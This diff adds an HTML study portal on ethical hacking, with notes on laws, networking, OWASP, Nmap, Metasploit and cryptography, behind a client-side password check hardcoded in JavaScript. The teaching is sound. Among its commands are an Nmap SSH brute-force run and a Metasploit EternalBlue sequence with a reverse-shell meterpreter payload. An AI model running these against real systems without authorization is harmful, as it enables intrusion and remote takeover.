@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyber Security Master Portal</title>
+    <style>
+        :root {
+            --hacker-green: #00ff00;
+            --hacker-dark: #0a0a0a;
+            --hacker-light: #121212;
+            --warning: #ff0;
+            --danger: #f00;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: var(--hacker-dark);
+            color: var(--hacker-green);
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+        
+        /* Login Screen */
+        #login-screen {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #000;
+        }
+        
+        .login-box {
+            border: 1px solid var(--hacker-green);
+            padding: 30px;
+            width: 350px;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+        }
+        
+        /* Main Layout */
+        #main-content {
+            display: none;
+            min-height: 100vh;
+        }
+        
+        /* Header */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 30px;
+            border-bottom: 1px solid var(--hacker-green);
+            background-color: var(--hacker-light);
+        }
+        
+        /* Navigation */
+        #sidebar {
+            width: 250px;
+            background-color: var(--hacker-light);
+            position: fixed;
+            height: 100vh;
+            padding: 20px;
+            border-right: 1px solid var(--hacker-green);
+            overflow-y: auto;
+        }
+        
+        #content-area {
+            margin-left: 250px;
+            padding: 30px;
+        }
+        
+        .nav-category {
+            color: var(--hacker-green);
+            margin: 20px 0 10px 0;
+            font-weight: bold;
+        }
+        
+        .nav-link {
+            display: block;
+            color: var(--hacker-green);
+            padding: 8px 10px;
+            margin: 5px 0;
+            text-decoration: none;
+            border-left: 3px solid transparent;
+            transition: all 0.3s;
+        }
+        
+        .nav-link:hover, .nav-link.active {
+            background-color: rgba(0, 255, 0, 0.1);
+            border-left: 3px solid var(--hacker-green);
+        }
+        
+        /* Content Modules */
+        .content-page {
+            display: none;
+        }
+        
+        .content-page.active {
+            display: block;
+        }
+        
+        .module {
+            background-color: rgba(0, 255, 0, 0.05);
+            border: 1px solid var(--hacker-green);
+            padding: 25px;
+            margin-bottom: 30px;
+        }
+        
+        h1, h2, h3 {
+            color: var(--hacker-green);
+        }
+        
+        h1 { border-bottom: 1px solid var(--hacker-green); padding-bottom: 10px; }
+        h2 { margin-top: 30px; }
+        
+        /* Code Blocks */
+        .code-block {
+            background-color: #111;
+            padding: 15px;
+            border-left: 3px solid var(--hacker-green);
+            overflow-x: auto;
+            margin: 15px 0;
+        }
+        
+        .code-comment { color: #888; }
+        .code-keyword { color: #00ffff; }
+        .code-string { color: #ff9900; }
+        
+        /* Alerts */
+        .warning {
+            border-left: 3px solid var(--warning);
+            padding: 15px;
+            background-color: rgba(255, 255, 0, 0.1);
+            margin: 20px 0;
+        }
+        
+        .danger {
+            border-left: 3px solid var(--danger);
+            padding: 15px;
+            background-color: rgba(255, 0, 0, 0.1);
+            margin: 20px 0;
+        }
+        
+        /* Tables */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        
+        th, td {
+            border: 1px solid var(--hacker-green);
+            padding: 10px;
+            text-align: left;
+        }
+        
+        th {
+            background-color: rgba(0, 255, 0, 0.1);
+        }
+        
+        /* Forms */
+        input, button, select {
+            font-family: 'Courier New', monospace;
+            background-color: #111;
+            border: 1px solid var(--hacker-green);
+            color: var(--hacker-green);
+            padding: 10px;
+            margin: 5px 0;
+        }
+        
+        button {
+            cursor: pointer;
+            transition: all 0.3s;
+            padding: 10px 20px;
+        }
+        
+        button:hover {
+            background-color: var(--hacker-green);
+            color: #000;
+        }
+        
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 20px;
+            border-top: 1px solid var(--hacker-green);
+            margin-top: 50px;
+            background-color: var(--hacker-light);
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            #sidebar {
+                width: 100%;
+                height: auto;
+                position: relative;
+                border-right: none;
+                border-bottom: 1px solid var(--hacker-green);
+            }
+            
+            #content-area {
+                margin-left: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Screen -->
+    <div id="login-screen">
+        <div class="login-box">
+            <h1>SECURE ACCESS PORTAL</h1>
+            <p>Owned by: <strong>YOUR NAME</strong></p>
+            <input type="password" id="login-password" placeholder="Enter Access Code">
+            <button onclick="checkLogin()">AUTHENTICATE</button>
+            <p id="login-error" style="color:#f00; display:none;">Invalid credentials</p>
+        </div>
+    </div>
+    
+    <!-- Main Content -->
+    <div id="main-content">
+        <header>
+            <h1>CYBER SECURITY MASTER PORTAL</h1>
+            <button id="logout-btn" onclick="showLogout()">LOGOUT</button>
+        </header>
+        
+        <div id="sidebar">
+            <div class="nav-category">Fundamentals</div>
+            <a href="#ethics" class="nav-link active">Ethical Hacking</a>
+            <a href="#terminology" class="nav-link">Terminology</a>
+            <a href="#legal" class="nav-link">Legal Framework</a>
+            
+            <div class="nav-category">Technical Skills</div>
+            <a href="#networking" class="nav-link">Networking Basics</a>
+            <a href="#linux" class="nav-link">Linux for Hackers</a>
+            <a href="#windows" class="nav-link">Windows Security</a>
+            <a href="#web" class="nav-link">Web App Security</a>
+            
+            <div class="nav-category">Tools</div>
+            <a href="#nmap" class="nav-link">Nmap</a>
+            <a href="#metasploit" class="nav-link">Metasploit</a>
+            <a href="#wireshark" class="nav-link">Wireshark</a>
+            <a href="#burp" class="nav-link">Burp Suite</a>
+            
+            <div class="nav-category">Advanced Topics</div>
+            <a href="#cryptography" class="nav-link">Cryptography</a>
+            <a href="#malware" class="nav-link">Malware Analysis</a>
+            <a href="#forensics" class="nav-link">Digital Forensics</a>
+            <a href="#redteam" class="nav-link">Red Teaming</a>
+        </div>
+        
+        <div id="content-area">
+            <!-- Page 1: Ethical Hacking -->
+            <div id="ethics" class="content-page active">
+                <h1>Ethical Hacking Principles</h1>
+                
+                <div class="module">
+                    <h2>What is Ethical Hacking?</h2>
+                    <p>Ethical hacking involves authorized attempts to bypass system security to identify vulnerabilities before malicious hackers can exploit them.</p>
+                    
+                    <div class="warning">
+                        <p>Unauthorized hacking is illegal. Ethical hackers must always have explicit permission.</p>
+                    </div>
+                    
+                    <h2>Certified Ethical Hacker (CEH) Domains</h2>
+                    <ol>
+                        <li>Footprinting and reconnaissance</li>
+                        <li>Scanning networks</li>
+                        <li>Enumeration</li>
+                        <li>Vulnerability analysis</li>
+                        <li>System hacking</li>
+                        <li>Malware threats</li>
+                        <li>Sniffing</li>
+                        <li>Social engineering</li>
+                        <li>Denial-of-service</li>
+                        <li>Session hijacking</li>
+                        <li>Evading IDS, firewalls, and honeypots</li>
+                        <li>Web server hacking</li>
+                        <li>Web application hacking</li>
+                        <li>SQL injection</li>
+                        <li>Wireless network hacking</li>
+                    </ol>
+                </div>
+                
+                <div class="module">
+                    <h2>Hacker Classifications</h2>
+                    <table>
+                        <tr>
+                            <th>Type</th>
+                            <th>Description</th>
+                            <th>Motivation</th>
+                        </tr>
+                        <tr>
+                            <td>White Hat</td>
+                            <td>Ethical hackers working to improve security</td>
+                            <td>Security improvement, legal compliance</td>
+                        </tr>
+                        <tr>
+                            <td>Black Hat</td>
+                            <td>Malicious hackers breaking laws</td>
+                            <td>Financial gain, disruption, theft</td>
+                        </tr>
+                        <tr>
+                            <td>Gray Hat</td>
+                            <td>Between white and black hats</td>
+                            <td>May violate laws but without malicious intent</td>
+                        </tr>
+                        <tr>
+                            <td>Script Kiddie</td>
+                            <td>Inexperienced using others' tools</td>
+                            <td>Thrill-seeking, notoriety</td>
+                        </tr>
+                    </table>
+                </div>
+            </div>
+            
+            <!-- Page 2: Terminology -->
+            <div id="terminology" class="content-page">
+                <h1>Hacking Terminology</h1>
+                
+                <div class="module">
+                    <h2>Essential Terms</h2>
+                    <dl>
+                        <dt>Zero-day</dt>
+                        <dd>A vulnerability unknown to the vendor with no patch available</dd>
+                        
+                        <dt>Payload</dt>
+                        <dd>The part of malware that performs malicious actions</dd>
+                        
+                        <dt>Exploit</dt>
+                        <dd>Code that takes advantage of a vulnerability</dd>
+                        
+                        <dt>Pivot</dt>
+                        <dd>Moving from one compromised system to others in the network</dd>
+                        
+                        <dt>Rootkit</dt>
+                        <dd>Malware designed to hide its existence on a system</dd>
+                    </dl>
+                    
+                    <h2>Attack Types</h2>
+                    <ul>
+                        <li><strong>Phishing</strong> - Fraudulent attempts to obtain sensitive information</li>
+                        <li><strong>MITM</strong> - Man-in-the-middle intercepting communications</li>
+                        <li><strong>DDoS</strong> - Distributed Denial of Service overwhelming resources</li>
+                        <li><strong>SQLi</strong> - SQL Injection manipulating database queries</li>
+                        <li><strong>XSS</strong> - Cross-site scripting injecting client-side scripts</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <!-- Page 3: Legal Framework -->
+            <div id="legal" class="content-page">
+                <h1>Legal Framework</h1>
+                
+                <div class="module">
+                    <h2>Key Cybersecurity Laws</h2>
+                    <ul>
+                        <li><strong>Computer Fraud and Abuse Act (CFAA)</strong> - Primary US anti-hacking law</li>
+                        <li><strong>General Data Protection Regulation (GDPR)</strong> - EU data protection</li>
+                        <li><strong>Computer Misuse Act</strong> - UK legislation against unauthorized access</li>
+                        <li><strong>DMCA</strong> - Digital Millennium Copyright Act</li>
+                    </ul>
+                    
+                    <div class="danger">
+                        <h3>Penalties for Unauthorized Access</h3>
+                        <p>Unauthorized access to computer systems can result in:</p>
+                        <ul>
+                            <li>Substantial fines (up to millions of dollars)</li>
+                            <li>Imprisonment (years in federal prison)</li>
+                            <li>Civil lawsuits</li>
+                            <li>Permanent criminal record</li>
+                        </ul>
+                    </div>
+                    
+                    <h2>Bug Bounty Programs</h2>
+                    <p>Legal way to find and report vulnerabilities for rewards:</p>
+                    <ul>
+                        <li>HackerOne</li>
+                        <li>Bugcrowd</li>
+                        <li>Company-specific programs (Google, Microsoft, etc.)</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <!-- Page 4: Networking Basics -->
+            <div id="networking" class="content-page">
+                <h1>Networking Fundamentals</h1>
+                
+                <div class="module">
+                    <h2>OSI Model Layers</h2>
+                    <ol>
+                        <li>Physical (cables, signals)</li>
+                        <li>Data Link (MAC, switches)</li>
+                        <li>Network (IP, routers)</li>
+                        <li>Transport (TCP/UDP)</li>
+                        <li>Session (establish/manage connections)</li>
+                        <li>Presentation (data formatting)</li>
+                        <li>Application (HTTP, FTP, SMTP)</li>
+                    </ol>
+                    
+                    <h2>Essential Protocols</h2>
+                    <table>
+                        <tr>
+                            <th>Protocol</th>
+                            <th>Port</th>
+                            <th>Purpose</th>
+                        </tr>
+                        <tr>
+                            <td>HTTP</td>
+                            <td>80</td>
+                            <td>Web traffic</td>
+                        </tr>
+                        <tr>
+                            <td>HTTPS</td>
+                            <td>443</td>
+                            <td>Secure web</td>
+                        </tr>
+                        <tr>
+                            <td>SSH</td>
+                            <td>22</td>
+                            <td>Secure shell</td>
+                        </tr>
+                        <tr>
+                            <td>FTP</td>
+                            <td>21</td>
+                            <td>File transfer</td>
+                        </tr>
+                        <tr>
+                            <td>DNS</td>
+                            <td>53</td>
+                            <td>Domain resolution</td>
+                        </tr>
+                    </table>
+                    
+                    <h2>Subnetting Basics</h2>
+                    <div class="code-block">
+                        <span class="code-comment"># Calculate network address from IP/CIDR</span><br>
+                        <span class="code-keyword">import</span> ipaddress<br>
+                        net = ipaddress.IPv4Network(<span class="code-string">'192.168.1.0/24'</span>)<br>
+                        <span class="code-keyword">print</span>(f<span class="code-string">"Network: {net.network_address}"</span>)<br>
+                        <span class="code-keyword">print</span>(f<span class="code-string">"Broadcast: {net.broadcast_address}"</span>)<br>
+                        <span class="code-keyword">print</span>(f<span class="code-string">"Usable hosts: {net.num_addresses - 2}"</span>)
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Page 5: Linux for Hackers -->
+            <div id="linux" class="content-page">
+                <h1>Linux for Ethical Hackers</h1>
+                
+                <div class="module">
+                    <h2>Essential Commands</h2>
+                    <div class="code-block">
+                        <span class="code-comment"># Network scanning</span><br>
+                        nmap -sV -O target.com<br><br>
+                        
+                        <span class="code-comment"># Packet capture</span><br>
+                        tcpdump -i eth0 -w capture.pcap<br><br>
+                        
+                        <span class="code-comment"># Process management</span><br>
+                        ps aux | grep ssh<br>
+                        kill -9 [PID]<br><br>
+                        
+                        <span class="code-comment"># File permissions</span><br>
+                        chmod 600 sensitive.txt<br>
+                        chown root:root secret.file
+                    </div>
+                    
+                    <h2>Important Directories</h2>
+                    <ul>
+                        <li><code>/etc/</code> - Configuration files</li>
+                        <li><code>/var/log/</code> - System logs</li>
+                        <li><code>/home/</code> - User directories</li>
+                        <li><code>/tmp/</code> - Temporary files</li>
+                        <li><code>/bin/</code>, <code>/sbin/</code> - Essential binaries</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <!-- Page 6: Windows Security -->
+            <div id="windows" class="content-page">
+                <h1>Windows Security</h1>
+                
+                <div class="module">
+                    <h2>Windows Security Architecture</h2>
+                    <ul>
+                        <li>Active Directory (AD)</li>
+                        <li>Security Account Manager (SAM)</li>
+                        <li>Local Security Authority (LSA)</li>
+                        <li>Windows Registry</li>
+                        <li>Event Logs</li>
+                    </ul>
+                    
+                    <h2>Common Attack Vectors</h2>
+                    <ol>
+                        <li>Pass-the-hash attacks</li>
+                        <li>LLMNR/NBT-NS poisoning</li>
+                        <li>SMB exploits</li>
+                        <li>Kerberos attacks</li>
+                        <li>DLL hijacking</li>
+                    </ol>
+                    
+                    <h2>PowerShell for Security</h2>
+                    <div class="code-block">
+                        <span class="code-comment"># Get system information</span><br>
+                        Get-WmiObject Win32_OperatingSystem | Select-Object *<br><br>
+                        
+                        <span class="code-comment"># Check running processes</span><br>
+                        Get-Process | Where-Object {$_.CPU -gt 50}<br><br>
+                        
+                        <span class="code-comment"># Network connections</span><br>
+                        Get-NetTCPConnection -State Established
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Page 7: Web App Security -->
+            <div id="web" class="content-page">
+                <h1>Web Application Security</h1>
+                
+                <div class="module">
+                    <h2>OWASP Top 10 Vulnerabilities</h2>
+                    <ol>
+                        <li>Injection (SQLi, OS command, etc.)</li>
+                        <li>Broken Authentication</li>
+                        <li>Sensitive Data Exposure</li>
+                        <li>XML External Entities (XXE)</li>
+                        <li>Broken Access Control</li>
+                        <li>Security Misconfiguration</li>
+                        <li>Cross-Site Scripting (XSS)</li>
+                        <li>Insecure Deserialization</li>
+                        <li>Using Components with Known Vulnerabilities</li>
+                        <li>Insufficient Logging & Monitoring</li>
+                    </ol>
+                    
+                    <h2>Testing Methodology</h2>
+                    <ul>
+                        <li>Reconnaissance</li>
+                        <li>Mapping the application</li>
+                        <li>Vulnerability scanning</li>
+                        <li>Exploitation</li>
+                        <li>Reporting</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <!-- Page 8: Nmap -->
+            <div id="nmap" class="content-page">
+                <h1>Nmap Network Scanning</h1>
+                
+                <div class="module">
+                    <h2>Common Nmap Commands</h2>
+                    <div class="code-block">
+                        <span class="code-comment"># Basic scan</span><br>
+                        nmap -sV 192.168.1.1<br><br>
+                        
+                        <span class="code-comment"># Aggressive scan</span><br>
+                        nmap -A -T4 target.com<br><br>
+                        
+                        <span class="code-comment"># Port range scan</span><br>
+                        nmap -p 1-1000 10.0.0.1<br><br>
+                        
+                        <span class="code-comment"># OS detection</span><br>
+                        nmap -O 192.168.1.100<br><br>
+                        
+                        <span class="code-comment"># Save output</span><br>
+                        nmap -oN scan.txt -oX scan.xml target.com
+                    </div>
+                    
+                    <h2>Nmap Scripting Engine</h2>
+                    <div class="code-block">
+                        <span class="code-comment"># Vulnerability scanning</span><br>
+                        nmap --script vuln target.com<br><br>
+                        
+                        <span class="code-comment"># HTTP enumeration</span><br>
+                        nmap --script http-enum -p80 target.com<br><br>
+                        
+                        <span class="code-comment"># Brute force attacks</span><br>
+                        nmap --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt target.com
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Page 9: Metasploit -->
+            <div id="metasploit" class="content-page">
+                <h1>Metasploit Framework</h1>
+                
+                <div class="module">
+                    <h2>Basic Workflow</h2>
+                    <ol>
+                        <li>Reconnaissance (gather info)</li>
+                        <li>Exploitation (gain access)</li>
+                        <li>Post-exploitation (maintain access, pivot)</li>
+                        <li>Reporting</li>
+                    </ol>
+                    
+                    <h2>Common Commands</h2>
+                    <div class="code-block">
+                        <span class="code-comment"># Start Metasploit</span><br>
+                        msfconsole<br><br>
+                        
+                        <span class="code-comment"># Search for exploits</span><br>
+                        search eternalblue<br><br>
+                        
+                        <span class="code-comment"># Use an exploit</span><br>
+                        use exploit/windows/smb/ms17_010_eternalblue<br><br>
+                        
+                        <span class="code-comment"># Set options</span><br>
+                        set RHOSTS 192.168.1.100<br>
+                        set PAYLOAD windows/x64/meterpreter/reverse_tcp<br>
+                        set LHOST 192.168.1.50<br><br>
+                        
+                        <span class="code-comment"># Run exploit</span><br>
+                        exploit
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Page 10: Cryptography -->
+            <div id="cryptography" class="content-page">
+                <h1>Cryptography Fundamentals</h1>
+                
+                <div class="module">
+                    <h2>Encryption Types</h2>
+                    <ul>
+                        <li><strong>Symmetric</strong> (AES, DES) - Same key encrypts/decrypts</li>
+                        <li><strong>Asymmetric</strong> (RSA, ECC) - Public/private key pairs</li>
+                        <li><strong>Hashing</strong> (SHA, MD5) - One-way functions</li>
+                    </ul>
+                    
+                    <h2>Common Attacks</h2>
+                    <ol>
+                        <li>Brute force</li>
+                        <li>Dictionary attacks</li>
+                        <li>Rainbow tables</li>
+                        <li>Side-channel attacks</li>
+                        <li>Man-in-the-middle</li>
+                    </ol>
+                    
+                    <h2>Python Crypto Example</h2>
+                    <div class="code-block">
+                        <span class="code-keyword">from</span> cryptography.fernet <span class="code-keyword">import</span> Fernet<br><br>
+                        
+                        <span class="code-comment"># Generate key</span><br>
+                        key = Fernet.generate_key()<br>
+                        cipher = Fernet(key)<br><br>
+                        
+                        <span class="code-comment"># Encrypt</span><br>
+                        message = <span class="code-string">"Secret message"</span>.encode()<br>
+                        encrypted = cipher.encrypt(message)<br><br>
+                        
+                        <span class="code-comment"># Decrypt</span><br>
+                        decrypted = cipher.decrypt(encrypted)<br>
+                        <span class="code-keyword">print</span>(decrypted.decode())
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Additional pages would continue here... -->
+            
+        </div>
+        
+        <footer>
+            <p>Owned by: <strong>YOUR NAME</strong> | For educational purposes only</p>
+            <div id="logout-panel" style="display:none; margin-top:20px;">
+                <input type="password" id="logout-password" placeholder="Enter Exit Code">
+                <button onclick="checkLogout()">CONFIRM LOGOUT</button>
+                <p id="logout-error" style="color:#f00; display:none;">Invalid exit code</p>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Configuration - CHANGE THESE!
+        const ACCESS_PASSWORD = "cyber123";  // Entry password
+        const EXIT_PASSWORD = "cyber321";    // Exit password
+        const OWNER_NAME = "DINESH CHOUDHARY";      // Replace with your name
+        
+        // Set owner name
+        document.querySelectorAll('strong').forEach(el => {
+            if (el.textContent === 'YOUR NAME') {
+                el.textContent = OWNER_NAME;
+            }
+        });
+        
+        // Navigation system
+        function setupNavigation() {
+            const navLinks = document.querySelectorAll('.nav-link');
+            
+            navLinks.forEach(link => {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    
+                    // Remove active class from all links and pages
+                    navLinks.forEach(l => l.classList.remove('active'));
+                    document.querySelectorAll('.content-page').forEach(page => {
+                        page.classList.remove('active');
+                    });
+                    
+                    // Add active class to clicked link
+                    this.classList.add('active');
+                    
+                    // Show corresponding page
+                    const target = this.getAttribute('href').substring(1);
+                    document.getElementById(target).classList.add('active');
+                });
+            });
+        }
+        
+        // Login function
+        function checkLogin() {
+            const input = document.getElementById('login-password').value;
+            const error = document.getElementById('login-error');
+            
+            if (input === ACCESS_PASSWORD) {
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('main-content').style.display = 'block';
+                setupNavigation();
+            } else {
+                error.style.display = 'block';
+                document.getElementById('login-password').value = '';
+            }
+        }
+        
+        // Show logout panel
+        function showLogout() {
+            document.getElementById('logout-panel').style.display = 'block';
+            document.getElementById('logout-btn').style.display = 'none';
+        }
+        
+        // Logout function
+        function checkLogout() {
+            const input = document.getElementById('logout-password').value;
+            const error = document.getElementById('logout-error');
+            
+            if (input === EXIT_PASSWORD) {
+                // Return to login screen
+                document.getElementById('main-content').style.display = 'none';
+                document.getElementById('login-screen').style.display = 'flex';
+                
+                // Reset forms
+                document.getElementById('login-password').value = '';
+                document.getElementById('logout-password').value = '';
+                error.style.display = 'none';
+                document.getElementById('logout-panel').style.display = 'none';
+                document.getElementById('logout-btn').style.display = 'block';
+            } else {
+                error.style.display = 'block';
+                document.getElementById('logout-password').value = '';
+            }
+        }
+        
+        // Allow Enter key for password fields
+        document.getElementById('login-password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') checkLogin();
+        });
+        
+        document.getElementById('logout-password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') checkLogout();
+        });
+    </script>
+</body>
+</html>
